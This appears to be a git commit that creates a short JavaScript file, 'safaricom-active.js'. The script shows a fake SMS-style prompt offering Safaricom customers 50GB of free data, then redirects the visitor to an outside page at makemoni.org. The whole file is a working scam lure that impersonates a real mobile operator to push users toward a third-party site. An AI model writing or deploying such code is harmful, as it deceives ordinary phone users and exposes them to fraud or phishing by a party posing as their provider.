bc2b51f2379a43541c783aa4d0394ef6bf65e747
bestplugg <nsiukpe247@gmail.com>
2025-07-26 08:25:09 +0100

    Create safaricom-active.js

---
+++ safaricom-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations, your Safaricom number is eligible to receive 50gb free data, Press Ok to activate Now ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://makemoni.org/safaricom.html';
+}
